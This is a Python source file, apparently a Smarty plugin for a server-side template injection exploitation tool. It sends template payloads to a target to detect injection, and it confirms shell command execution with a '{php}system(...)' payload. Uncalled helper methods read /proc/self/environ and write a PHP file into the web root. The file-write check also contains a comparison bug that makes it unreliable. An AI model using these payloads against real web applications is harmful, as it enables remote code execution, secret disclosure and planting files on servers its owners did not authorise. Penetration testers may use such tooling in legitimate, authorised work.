from core.check import Check
from utils.loggers import log
from utils import rand
import string
import requests
import urlparse
import os

class Smarty(Check):
    
    def init(self):
        
        # Declare payload
        self.base_tag = '{%s}'
        
        # Skip reflection check if same tag has been detected before
        if self.get('reflect_tag') != self.base_tag:
            self._check_reflection()
        
            # Return if reflect_tag is not set
            if not self.get('reflect_tag'):
                return
                
            log.warn('Reflection detected with tag \'%s\'' % self.get('reflect_tag'))
        
        self._check_engine()
            
        if not self.get('language') or  not self.get('engine'):
            return
            
        log.warn('Smarty engine detected')   
        
        self._check_os()
        
        if self.get('exec'):
            log.warn(
                'Shell command execution detected on \'%s\' operating system' % (
                    self.get('os', 'undetected')
                )
            )
        
        # I've tested the techniques described in this article
        # http://blog.portswigger.net/2015/08/server-side-template-injection.html
        # for Smarty version prior 3.1.24 (3.1.23 and 3.1.21) but do not work for me.
        # 
        # Example on 3.1.21 when trying reading file with using self::getStreamVariable():
        # Cannot access self:: when no class scope is active in smarty-3.1.21/libs/sysplugins/smarty_internal_templatebase.php(157) : eval()'d code on line 23
        
        #self._check_read()
        #if self.get('read'):
        #    log.warn('Can ready arbitrary file')
        #self._check_write()
            
    def _check_engine(self):
        
        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)
        
        payload = '%s{*%s*}%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB
                
        if expected == self.req(payload):
            self.set('language', 'php')
            self.set('engine', 'smarty-*')
    
    def _check_reflection(self):
        
        randA = rand.randint_n(1)
        randB = rand.randint_n(1)

        payload = '{%i*%i}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflect_tag', self.base_tag)
        
    def _check_os(self):
        
        expected_rand = str(rand.randint_n(1))
        payload = """{php}system('echo %s');{/php}""" % expected_rand
        
        result_php_tag = self.req(payload) 
        
        # If {php} is sent back means is in secure mode
        if '{php}' in result_php_tag:
            self.set('engine', 'smarty-secured')
        elif expected_rand == result_php_tag:
            self.set('engine', 'smarty-unsecured')
            self.set('exec', True)
    
            payload = """{php}echo PHP_OS;{/php}"""
            self.set('os', self.req(payload))
    
    def _check_read(self):
        
        payload = """{self::getStreamVariable("file:///proc/self/environ")}"""
        result_proc_self_environ = self.req(payload)
        
        if 'PATH=' in result_proc_self_environ:
            self.set('read', True)
            
    def _check_write(self):
        
        rand_filename = rand.randstr_n(5) + '.php'

        payload = """{Smarty_Internal_Write_File::writeFile("%s","1",self::clearConfig())}""" % rand_filename
        self.req(payload)
        
        url_path = urlparse.urlparse(self.channel.url).path
        url_folder, url_file = os.path.split(url_path)
        
        url = self.channel.url.replace(url_file, rand_filename)
        
        print requests.get(url) == '1', url, requests.get(url)
        
        if requests.get(url) == '1':
            self.set('write', True)
        
        
